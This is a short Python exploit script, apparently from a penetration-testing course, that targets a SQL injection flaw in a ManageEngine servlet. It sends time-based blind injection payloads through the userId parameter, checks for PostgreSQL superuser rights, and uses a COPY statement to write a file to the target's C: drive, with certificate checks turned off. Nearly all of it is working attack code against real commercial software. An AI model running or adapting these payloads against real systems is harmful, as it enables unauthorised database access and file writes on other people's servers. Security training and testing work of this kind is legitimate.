#!/usr/bin/env python3

"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: Testing for SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
"""

import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import subprocess
import base64

def blindSQLi(url):
	sqli = ";select+pg_sleep(10);"
	sqli_pg_user = ";SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+"
	sqli_file_make=";COPY+(SELECT+$$offsec$$)+to+$$c:\\offsec.txt$$;--+"
	print("\nRequest will return in 10 seconds if we have SQLi")
	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print(r.text)
	print(r.headers)
	
	print("\nRequest will return in 10 seconds if we are a superuser\n")
	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % sqli_pg_user, verify=False)
	print(r.text)
	print(r.headers)

	print("\nCreating file in C:\\")
	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % url, 
					  params='ForMasRange=1&userId=1%s' % sqli_file_make, verify=False)
	print(r.text)
	print(r.headers)


def main():
	if len(sys.argv) != 2:
		print(f"(+) usage %s <target>" % sys.argv[0])
		print(f"(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	target = sys.argv[1]
	blindSQLi(target)

if __name__ == '__main__':
	main()